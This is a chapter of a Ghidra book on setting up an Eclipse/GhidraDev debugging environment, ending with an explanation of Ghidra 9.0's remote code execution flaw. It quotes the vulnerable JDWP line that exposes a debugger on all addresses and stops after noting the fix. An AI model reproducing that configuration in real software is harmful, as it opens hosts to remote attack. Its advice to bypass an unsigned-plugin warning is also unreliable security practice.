<html><head></head><body><div><p>&#13;
			<h1 id="_idParaDest-35"><em class="italic"><a id="_idTextAnchor041"/>Chapter 3</em>: Ghidra Debug Mode</h1>&#13;
			<p><a id="_idTextAnchor042"/>In this chapter, we will introduce Ghidra debug mode. By using the Eclipse IDE, you will be able to develop and debug, in a professional way, any feature of Ghidra, including plugins, which were covered in the previous chapter.</p>&#13;
			<p>We choose to use the Eclipse IDE (https://ghidra-sre.org/InstallationGuide.html) because it is the only one officially supported by Ghidra. It is technically possible to use other ones, but they are not officially supported. There is a severe security issue in the Ghidra debug mode functionality that affects Ghidra 9.0, so please use any later version of the program to deploy your development environment. The current safe and stable version at the time of writing this book is 9.1.2.</p>&#13;
			<p><a id="_idTextAnchor043"/>Finally, you will learn how to exploit the <strong class="bold">remote code execution</strong> (<strong class="bold">RCE</strong>) vulnerability.</p>&#13;
			<p>In this chapter, we're going to cover the following main topics: </p>&#13;
			<ul>&#13;
				<li>Setting up the Ghidra development environment</li>&#13;
				<li>Debugging the Ghidra code and Ghidra scripts</li>&#13;
				<li>Ghidra RCE vulnerability</li>&#13;
			</ul>&#13;
			<h1 id="_idParaDest-36"><a id="_idTextAnchor044"/>Technical requirements </h1>&#13;
			<p>The GitHub repository containing all the necessary code for this chapter can be found here:</p>&#13;
			<p><a href="https://github.com/PacktPublishing/Ghidra-Software-Reverse-Engineering-for-Beginners">https://github.com/PacktPublishing/Ghidra-Software-Reverse-Engineering-for-Beginners</a></p>&#13;
			<p>Check out the following link to see the Code in Action video: <a href="https://bit.ly/37EfC5a">https://bit.ly/37EfC5a</a></p>&#13;
			<h1 id="_idParaDest-37"><a id="_idTextAnchor045"/>Setting up the Ghidra development environment</h1>&#13;
			<p>For the purpose <a id="_idIndexMarker056"/>of this chapter, you will need to install the following <a id="_idIndexMarker057"/>software requirements:</p>&#13;
			<ul>&#13;
				<li>Java JDK 11 for x86_64 (available here: <a href="https://adoptopenjdk.net/releases.html?variant=openjdk11&amp;jvmVariant=hotspot">https://adoptopenjdk.net/releases.html?variant=openjdk11&amp;jvmVariant=hotspot</a>).</li>&#13;
				<li>The Eclipse IDE for Java developers (any version supporting JDK 11, available here: <a href="https://www.eclipse.org/downloads/packages/">https://www.eclipse.org/downloads/packages/</a>) as it is the IDE that is officially integrated and supported by Ghidra.</li>&#13;
				<li>PyDev 6.3.1 (available here: <a href="https://netix.dl.sourceforge.net/project/pydev/pydev/PyDev%206.3.1/PyDev%206.3.1.zip">https://netix.dl.sourceforge.net/project/pydev/pydev/PyDev%206.3.1/PyDev%206.3.1.zip</a>).</li>&#13;
				<li>The GhidraDev plugin (available here: <a href="https://github.com/NationalSecurityAgency/ghidra/tree/f33e2c129633d4de544e14bc163ea95a4b52bac5/GhidraBuild/EclipsePlugins/GhidraDev">https://github.com/NationalSecurityAgency/ghidra/tree/f33e2c129633d4de544e14bc163ea95a4b52bac5/GhidraBuild/EclipsePlugins/GhidraDev</a>).</li>&#13;
			</ul>&#13;
			<h2 id="_idParaDest-38"><a id="_idTextAnchor046"/>Overviewing the software requirements</h2>&#13;
			<p>We need the <strong class="bold">Java Development Kit</strong> (<strong class="bold">JDK</strong>) and PyDev <a id="_idIndexMarker058"/>because they allow us to work with the Java <a id="_idIndexMarker059"/>and Python programming languages, respectively. Eclipse is the officially supported and integrated IDE for Ghidra development.</p>&#13;
			<p>Although Eclipse is the only officially supported IDE, it is technically possible to integrate IntelliJ with Ghidra (<a href="https://reversing.technology/2019/11/18/ghidra-dev-pt3-dbg.html">https://reversing.technology/2019/11/18/ghidra-dev-pt3-dbg.html</a>) or any other IDE for advanced purposes and to deeply investigate how integration works.</p>&#13;
			<p>You can install more dependencies if you want. In fact, more dependencies could eventually be required to debug and/or develop specific components.</p>&#13;
			<p class="callout-heading">Ghidra DevGuide documentation</p>&#13;
			<p class="callout">If you want to install all the necessary dependencies for a full Ghidra development environment, then you can refer to <strong class="bold">Catalog of Dependencies</strong> in the documentation, which is also useful for answering specific questions when setting up the environment. You can find the documentation at https://github.com/NationalSecurityAgency/ghidra/blob/master/DevGuide.md. The documentation currently explicitly says that you can install these dependencies in no particular order but, in this case, it is recommended to install the Java JDK first because it will be required later by Eclipse.</p>&#13;
			<h2 id="_idParaDest-39"><a id="_idTextAnchor047"/>Installing the Java JDK</h2>&#13;
			<p>The installation of the JDK is <a id="_idIndexMarker060"/>straightforward. First, you <a id="_idIndexMarker061"/>have to decompress the ZIP file and set the <code>JAVA_HOME</code> environment variable to the JDK decompressed location, and then add the path of its <code>bin</code> directory to the <code>PATH</code> environment variable.</p>&#13;
			<p>You can check whether the installation of the JDK was successful by printing the <code>JAVA_HOME</code> content and the Java version. To do that, use the following two commands and check the output:</p>&#13;
			<pre>C:\Users\virusito&gt;echo %JAVA_HOME%</pre>&#13;
			<pre>C:\Program Files\jdk-11.0.6+10</pre>&#13;
			<pre>C:\Users\virusito&gt;java –version</pre>&#13;
			<pre>openjdk version "11.0.6" 2020-01-14</pre>&#13;
			<pre>OpenJDK Runtime Environment AdoptOpenJDK (build 11.0.6+10)</pre>&#13;
			<pre>OpenJDK 64-Bit Server VM AdoptOpenJDK (build 11.0.6+10, mixed mode)</pre>&#13;
			<p>The previous output indicates that JDK 11.0.6 was successfully installed and configured.</p>&#13;
			<h2 id="_idParaDest-40"><a id="_idTextAnchor048"/>Installing the Eclipse IDE</h2>&#13;
			<p>Once the Java JDK is <a id="_idIndexMarker062"/>installed, let's go <a id="_idIndexMarker063"/>ahead and install <strong class="bold">Eclipse IDE for Java Developers</strong> (other Eclipse installations might have problems) by downloading it from the <strong class="bold">packages</strong> section of its official website (https://www.eclipse.org/downloads/packages/):</p>&#13;
			<div>&#13;
				<div>&#13;
					<img src="img/B16207_03_001.jpg" alt="Figure 3.1 – Downloading Eclipse IDE for Java Developers&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.1 – Downloading Eclipse IDE for Java Developers</p>&#13;
			<p>The next step is to install PyDev from Eclipse.</p>&#13;
			<h2 id="_idParaDest-41"><a id="_idTextAnchor049"/>Installing PyDev</h2>&#13;
			<p>After installing Eclipse, extract or <a id="_idIndexMarker064"/>decompress the contents of the <code>PyDev 6.3.1</code> ZIP file <a id="_idIndexMarker065"/>we downloaded earlier when setting up the lab to a folder by right-clicking on it and choosing <strong class="bold">Extract All…</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_002.jpg" alt="Figure 3.2 – Decompressing PyDev to a folder&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.2 – Decompressing PyDev to a folder</p>&#13;
			<p>Decompress all the contents of <code>PyDev 6.3.1.zip</code> to a folder named <code>PyDev 6.3.1</code>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_003.jpg" alt="Figure 3.3 – Decompressing the contents of the PyDev 6.3.1.zip file&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.3 – Decompressing the contents of the PyDev 6.3.1.zip file</p>&#13;
			<p>Install it <a id="_idIndexMarker066"/>from Eclipse by clicking on the <strong class="bold">Install New Software…</strong> option of the <strong class="bold">Help</strong> menu and add the folder path <a id="_idIndexMarker067"/>of the decompressed PyDev archive file as the local repository (the <strong class="bold">Local…</strong> option in the following screenshot):</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_004.jpg" alt="Figure 3.4 – Adding PyDev as the Eclipse local repository&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.4 – Adding PyDev as the Eclipse local repository</p>&#13;
			<p>It is quite common to get stuck at this point. As you can see in the following screenshot, no categorized items exist. Please, uncheck the <strong class="bold">Group items by category</strong> option to avoid this:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_005.jpg" alt="Figure 3.5 – ThePyDev plugin installer is NOT visible because installers are grouped by category&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.5 – ThePyDev plugin installer is NOT visible because installers are grouped by category</p>&#13;
			<p>After <a id="_idIndexMarker068"/>unchecking <strong class="bold">Group items by category</strong>, you will be <a id="_idIndexMarker069"/>able to select the <strong class="bold">PyDev for Eclipse</strong> option in order to install it:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_006.jpg" alt="Figure 3.6 – Checking PyDev to be installed&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.6 – Checking PyDev to be installed</p>&#13;
			<p>Click on <strong class="bold">Next &gt;</strong> to continue the installation:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_007.jpg" alt="Figure 3.7 – Reviewing the items to be installed&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.7 – Reviewing the items to be installed</p>&#13;
			<p>Before <a id="_idIndexMarker070"/>installing PyDev, you must accept <a id="_idIndexMarker071"/>the license:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_008.jpg" alt="Figure 3.8 – Accepting the PyDev license&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.8 – Accepting the PyDev license</p>&#13;
			<p>After installing PyDev, you will need to restart Eclipse to let the changes in the software take effect:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_009.jpg" alt="Figure 3.9 – Restarting Eclipse&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.9 – Restarting Eclipse</p>&#13;
			<p>After <a id="_idIndexMarker072"/>this step, you will get Python support for Eclipse. You can check it <a id="_idIndexMarker073"/>by clicking on <strong class="bold">Help</strong> | <strong class="bold">About Eclipse IDE</strong> | <strong class="bold">Installation Details</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_010.jpg" alt="Figure 3.10 – Verifying that PyDev was successfully installed in Eclipse&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.10 – Verifying that PyDev was successfully installed in Eclipse</p>&#13;
			<p>This Eclipse menu is also useful for updating, uninstalling, and seeing the properties of any installed Eclipse IDE extensions.</p>&#13;
			<h2 id="_idParaDest-42"><a id="_idTextAnchor050"/>Installing GhidraDev</h2>&#13;
			<p>Similar <a id="_idIndexMarker074"/>to how we installed PyDev, for <a id="_idIndexMarker075"/>Ghidra/Eclipse synchronization, you need to install the GhidraDev plugin, available in Ghidra's installation directory at <code>Extensions\Eclipse\GhidraDev\GhidraDev-2.1.0.zip</code>, but this time, do not decompress it but use the <strong class="bold">Archive…</strong> option instead:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_011.jpg" alt="Figure 3.11 – Adding GhidraDev as an Eclipse local repository&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.11 – Adding GhidraDev as an Eclipse local repository</p>&#13;
			<p>After that, click on <strong class="bold">Add</strong>. In this case, you don't need to worry about the <strong class="bold">Group items by category</strong> option because a <strong class="bold">Ghidra</strong> category exists containing the <strong class="bold">GhidraDev</strong> plugin we are interested in. Just make sure that the <strong class="bold">GhidraDev</strong> option is marked and click on the <strong class="bold">Next &gt;</strong> button:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_012.jpg" alt="Figure 3.12 – Installing the GhidraDev plugin&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.12 – Installing the GhidraDev plugin</p>&#13;
			<p>After that, you can take the opportunity to review the installation details. Click on <strong class="bold">Next &gt;</strong> again to continue installing GhidraDev:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_013.jpg" alt="Figure 3.13 – Reviewing the items to be installed&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.13 – Reviewing the items to be installed</p>&#13;
			<p>Accept <a id="_idIndexMarker076"/>the GhidraDev license terms <a id="_idIndexMarker077"/>and click on <strong class="bold">Finish</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_014.jpg" alt="Figure 3.14 – Accepting the GhidraDev license terms&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.14 – Accepting the GhidraDev license terms</p>&#13;
			<p>In this case, a security warning will appear. Don't worry about it. The authenticity of the plugin cannot be verified because it is not signed. Click on <strong class="bold">Install anyway</strong> to continue:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_015.jpg" alt="Figure 3.15 – Accepting the security warning&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.15 – Accepting the security warning</p>&#13;
			<p>To let the <a id="_idIndexMarker078"/>changes take effect, click on <strong class="bold">Restart Now</strong> to restart <a id="_idIndexMarker079"/>the Eclipse IDE:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_016.jpg" alt="Figure 3.16 – Restarting the Eclipse IDE&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.16 – Restarting the Eclipse IDE</p>&#13;
			<p>As you know, you can check whether GhidraDev is installed via <strong class="bold">Help</strong> | <strong class="bold">About Eclipse IDE</strong> | <strong class="bold">Installation Details</strong>. But in this case, the plugin is incorporated into the menu bar of Eclipse, so you can easily notice whether the installation was successful by checking the menu bar:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_017.jpg" alt="Figure 3.17 – GhidraDev plugin installed&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.17 – GhidraDev plugin installed</p>&#13;
			<p>After that, the GhidraDev plugin will be installed and you will also be able to specify where Ghidra installations are located in order to link them to your development projects. Use <strong class="bold">GhidraDev</strong> | <strong class="bold">Preferences</strong> | <strong class="bold">Ghidra Installations…</strong> to do so.</p>&#13;
			<p>In this case, I have two Ghidra installations (<strong class="bold">Ghidra_9.1.1_PUBLIC</strong> and <strong class="bold">Ghidra_9.1.1_PUBLIC - other</strong>), where <strong class="bold">Ghidra_9.1.1_PUBLIC</strong> is checked as default. Ghidra <a id="_idIndexMarker080"/>installations can be added <a id="_idIndexMarker081"/>by clicking on the <strong class="bold">Add…</strong> button and removed by selecting the installation row on the table and clicking on <strong class="bold">Remove</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_018.jpg" alt="Figure 3.18 – Adding Ghidra installation directories to GhidraDev&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.18 – Adding Ghidra installation directories to GhidraDev</p>&#13;
			<p>In the next section, we will cover Ghidra debugging, which enables us not only to identify and fix programming errors in scripts but also to follow the execution of Ghidra step by step. The ability to debug will be very useful because it opens up to you all the low-level internal details of Ghidra for fun and advanced development.</p>&#13;
			<h1 id="_idParaDest-43"><a id="_idTextAnchor051"/>Debugging the Ghidra code and Ghidra scripts</h1>&#13;
			<p>In this section, we <a id="_idIndexMarker082"/>will explore how to debug Ghidra features <a id="_idIndexMarker083"/>from Eclipse. We will start by reviewing how to develop scripts and how to debug them, and then we will conclude by showing how to debug any Ghidra component from the source code.</p>&#13;
			<h2 id="_idParaDest-44"><a id="_idTextAnchor052"/>Debugging Ghidra scripts from Eclipse</h2>&#13;
			<p>Let's go <a id="_idIndexMarker084"/>ahead and debug a Ghidra script. First, we will need to <a id="_idIndexMarker085"/>create a new Ghidra project using the <code>GhidraScripts</code>, which is the default or suggested value:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_019.jpg" alt="Figure 3.19 – Creating a Ghidra script project&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.19 – Creating a Ghidra script project</p>&#13;
			<p>After clicking on <code>C:\Users\virusito\ghidra_scripts</code>) and the scripts included with your Ghidra installation with checkboxes:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_020.jpg" alt="Figure 3.20 – Configuring the new Ghidra script project&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.20 – Configuring the new Ghidra script project</p>&#13;
			<p>You will be able to <a id="_idIndexMarker086"/>choose a Ghidra installation previously <a id="_idIndexMarker087"/>configured via <strong class="bold">GhidraDev</strong> | <strong class="bold">Preferences</strong> | <strong class="bold">Ghidra Installations…</strong>, and you can also open the Ghidra installation window in order to add/remove Ghidra installation directories via the <strong class="bold">+</strong> button:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_021.jpg" alt="Figure 3.21 – Linking a Ghidra installation to the Ghidra script project being created&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.21 – Linking a Ghidra installation to the Ghidra script project being created</p>&#13;
			<p>After clicking on <strong class="bold">Next &gt;</strong>, you will be able to enable Python support through Jython. You can add the Jython interpreter that comes with Ghidra or download your own interpreter (available here: <a href="https://www.jython.org/download">https://www.jython.org/download</a>) by clicking on the <strong class="bold">+</strong> button:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_022.jpg" alt="Figure 3.22 – Adding Python support to the Ghidra script project via Jython&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.22 – Adding Python support to the Ghidra script project via Jython</p>&#13;
			<p>If you <a id="_idIndexMarker088"/>want to use the interpreter that comes with Ghidra (available in <a id="_idIndexMarker089"/>the following directory: <code>\Ghidra\Features\Python\lib\jython-standalone-2.7.1.jar</code>) and you already have Ghidra linked to the project, you are presented with this option, which avoids having to manually look for it yourself. Answer affirmatively to the dialog window:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_023.jpg" alt="Figure 3.23 – Automatically adding the Jython interpreter that comes with Ghidra&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.23 – Automatically adding the Jython interpreter that comes with Ghidra</p>&#13;
			<p>After that, you will have a Jython interpreter available and it is sufficient for general purposes. But if at any time you have the need to link your own interpreter, click on <strong class="bold">+</strong> | <strong class="bold">New…</strong> | <strong class="bold">Browse</strong> and, after <a id="_idIndexMarker090"/>adding your Jython <a id="_idIndexMarker091"/>interpreter, click <strong class="bold">OK</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_024.jpg" alt="Figure 3.24 – Adding your own Jython interpreter&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.24 – Adding your own Jython interpreter</p>&#13;
			<p>If you receive the following message, click on <strong class="bold">Proceed anyways</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_025.jpg" alt="Figure 3.25 – Adding the Python standard library to PYTHONPATH in Eclipse&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.25 – Adding the Python standard library to PYTHONPATH in Eclipse</p>&#13;
			<p>Use the <a id="_idIndexMarker092"/>following command to retrieve the <code>/Lib</code> folder <a id="_idIndexMarker093"/>path:</p>&#13;
			<pre>C:\Users\virusito&gt;python -c "from distutils.sysconfig import get_python_lib; print(get_python_lib())"</pre>&#13;
			<pre>c:\Python27\Lib\site-packages</pre>&#13;
			<pre>C:\Users\virusito&gt;</pre>&#13;
			<p>Add that folder to <code>PYTHONPATH</code> using <strong class="bold">New Folder</strong> and, after checking that it was added, as shown in the following screenshot, click on <strong class="bold">Apply and Close</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_026.jpg" alt="Figure 3.26 – Applying the changes in PYTHONPATH&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.26 – Applying the changes in PYTHONPATH</p>&#13;
			<p>Now, you <a id="_idIndexMarker094"/>can choose your own interpreter or the other one included with Ghidra. Make <a id="_idIndexMarker095"/>your choice and click on <strong class="bold">Finish</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_027.jpg" alt="Figure 3.27 – Choosing an available Jython interpreter&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.27 – Choosing an available Jython interpreter</p>&#13;
			<p>Before moving on to actually debugging, let's first see how our environment looks and notice the following.</p>&#13;
			<p>The Ghidra script project we created consists of some folders containing existing scripts available in your Ghidra installation directory (you can check the path of any of these folders when selected by pressing the <em class="italic">Alt</em> + <em class="italic">Enter</em> hotkey combination in Eclipse) and also your home scripts by default, located in the <code>%userprofile%\ghidra_scripts\</code> folder.</p>&#13;
			<p><code>JUnit 4</code>, the JDK (<code>JRE System Library</code>), and <code>Referenced Libraries</code> (including Ghidra libraries) are also linked to the project, as well as the entire Ghidra installation folder:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_028.jpg" alt="Figure 3.28 – Ghidra script project structure&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption">Figure 3.28 – Ghidra script project structure</p>&#13;
			<p>By right-clicking <a id="_idIndexMarker096"/>on the project and choosing <strong class="bold">Run As</strong> or <strong class="bold">Debug As</strong>, you will notice <a id="_idIndexMarker097"/>that two running and debugging modes, respectively, were automatically created when installing the GhidraDev plugin.</p>&#13;
			<p>The first one, <strong class="bold">Ghidra</strong> running mode, allows you to run Ghidra in a GUI environment, while the second one, <strong class="bold">Ghidra Headless</strong>, allows you to execute Ghidra in non-GUI mode:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_029.jpg" alt="Figure 3.29 – Project running modes&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.29 – Project running modes</p>&#13;
			<p>Let's debug the <code>NopScript.java</code> Ghidra script code developed in <a href="B16207_02_Final_SK_ePub.xhtml#_idTextAnchor031"><em class="italic">Chapter 2</em></a>, <em class="italic">Automating RE Tasks with Ghidra Scripts</em>, by pasting it into Eclipse, which is now integrated with Ghidra.</p>&#13;
			<p>In order to create a new script, follow these steps: </p>&#13;
			<ol>&#13;
				<li>Go to <strong class="bold">GhidraDev</strong> | <strong class="bold">New</strong> | <strong class="bold">Ghidra Script...</strong>:<div><img src="img/B16207_03_030.jpg" alt="Figure 3.30 – Creating a new Ghidra script&#13;&#10;"/></div><p class="figure-caption"> </p><p class="figure-caption">Figure 3.30 – Creating a new Ghidra script</p></li>&#13;
				<li>Fill <a id="_idIndexMarker098"/>in the required fields, as <a id="_idIndexMarker099"/>follows:<div><img src="img/B16207_03_031.jpg" alt="Figure 3.31 – Creating the NopScript.java Ghidra script&#13;&#10;"/></div><p class="figure-caption"> </p><p class="figure-caption">Figure 3.31 – Creating the NopScript.java Ghidra script</p></li>&#13;
				<li>Let GhidraDev generate the corresponding script skeleton. Fill the script body by pasting the <code>NopScript.java</code> Ghidra script code written in <a href="B16207_02_Final_SK_ePub.xhtml#_idTextAnchor031"><em class="italic">Chapter 2</em></a>, <em class="italic">Automating RE Tasks with Ghidra Scripts</em>:<div><img src="img/B16207_03_032.jpg" alt="Figure 3.32 – Overwriting the skeleton code with the NopScript.java code&#13;&#10;"/></div><p class="figure-caption"> </p><p class="figure-caption">Figure 3.32 – Overwriting the skeleton code with the NopScript.java code</p></li>&#13;
				<li>You can let <a id="_idIndexMarker100"/>the program break in some <a id="_idIndexMarker101"/>lines of the script by adding a breakpoint to it. Breakpoints can be established by right-clicking on the line number you want to break on and choosing <strong class="bold">Toggle Breakpoint</strong>. Alternatively, double-clicking on the line number or pressing the <em class="italic">Ctrl</em> + <em class="italic">Shift</em> + <em class="italic">B</em> combination while keeping the mouse focus on the line will also work:<div><img src="img/B16207_03_033.jpg" alt="Figure 3.33 – Setting a breakpoint in the script on line 17&#13;&#10;"/></div><p class="figure-caption">Figure 3.33 – Setting a breakpoint in the script on line 17</p></li>&#13;
				<li>Now, you can debug this code by right-clicking on it and choosing <strong class="bold">Debug As</strong> | <strong class="bold">Ghidra</strong>:<div><img src="img/B16207_03_034.jpg" alt="Figure 3.34 – Debugging a Ghidra script&#13;&#10;"/></div><p class="figure-caption">Figure 3.34 – Debugging a Ghidra script</p></li>&#13;
				<li>To force Ghidra <a id="_idIndexMarker102"/>to reach the line where the <a id="_idIndexMarker103"/>breakpoint is established, you will need to run the plugin over a chosen byte of a file in Ghidra, which is now synchronized with Eclipse using GhidraDev. As this script has associated the <em class="italic">Ctrl</em> + <em class="italic">Alt</em> + <em class="italic">Shift</em> + <em class="italic">N</em> hotkeys, you can use them in order to execute it over a byte of a file:</li>&#13;
			</ol>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_035.jpg" alt="Figure 3.35 – Debugging NopScript.java in Ghidra&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption">Figure 3.35 – Debugging NopScript.java in Ghidra</p>&#13;
			<p>In the <a id="_idIndexMarker104"/>same way, Ghidra Python scripts can be also <a id="_idIndexMarker105"/>debugged from Eclipse using PyDev integration:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_036.jpg" alt="Figure 3.36 – Debugging NopScript.py in Ghidra&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption">Figure 3.36 – Debugging NopScript.py in Ghidra</p>&#13;
			<p>The same procedure can be applied not only to home scripts but also to any other plugin available in the project.</p>&#13;
			<h2 id="_idParaDest-45"><a id="_idTextAnchor053"/>Debugging any Ghidra component from Eclipse</h2>&#13;
			<p>You can <a id="_idIndexMarker106"/>debug not only plugins but also any features <a id="_idIndexMarker107"/>in Ghidra. For instance, if you want to debug the <code>Graph.jar</code>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_037.jpg" alt="Figure 3.37 – Adding the Graph.jar file to the build path&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.37 – Adding the Graph.jar file to the build path</p>&#13;
			<p>Then, you can link the JAR file (now available in the build path) to its own source code. The source code is located in the same folder, named <code>Grahp-src.zip</code>. To link the source code, you need to open the <code>Graph.jar</code> properties by right-clicking on the JAR file, and then attach the ZIP file in the <strong class="bold">Workspace location</strong> field of the <strong class="bold">Java Source Attachment</strong> section:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_038.jpg" alt="Figure 3.38 – Linking the Graph.jar file to its own source code&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 3.38 – Linking the Graph.jar file to its own source code</p>&#13;
			<p>After that, you will be able to expand the <code>Graph.jar</code> file, showing the included <code>*.class</code> files. You will be able to see the source code because it is linked now. You will be also able to add breakpoints to it, which will be hit when the corresponding line is reached during a debugging session:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_03_039.jpg" alt="Figure 3.39 – Debugging the Function Graph feature&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption">Figure 3.39 – Debugging the Function Graph feature</p>&#13;
			<p>In this section, you <a id="_idIndexMarker108"/>learned how to integrate Eclipse and Ghidra using the GhidraDev plugin. We saw how to develop and debug Ghidra plugins <a id="_idIndexMarker109"/>from the IDE and, finally, how to debug any feature of Ghidra of your choice, which allows you to master Ghidra internals on your own.</p>&#13;
			<h1 id="_idParaDest-46"><a id="_idTextAnchor054"/>Ghidra RCE vulnerability</h1>&#13;
			<p>In this section, we will <a id="_idIndexMarker110"/>learn how the RCE vulnerability found in Ghidra 9.0 works, how to exploit it, and how to fix it. </p>&#13;
			<h2 id="_idParaDest-47"><a id="_idTextAnchor055"/>Explaining the Ghidra RCE vulnerability </h2>&#13;
			<p>The vulnerability was <a id="_idIndexMarker111"/>due to a line located in <code>launch.bat</code> when running Ghidra on Windows platforms and <code>launch.sh</code> when running it on Linux or macOS. The following is the line involved:</p>&#13;
			<pre>-Xrunjdwp:transport=dt_socket,server=y,suspend=${SUSPEND},address=*:${DEBUG_PORT}</pre>&#13;
			<p>The vulnerability was fixed in the second version of Ghidra 9.0.1 by replacing the asterisk (<code>*</code>), which indicates all addresses are allowed to attach the debugger to Ghidra, and limiting it to <code>localhost</code>: </p>&#13;
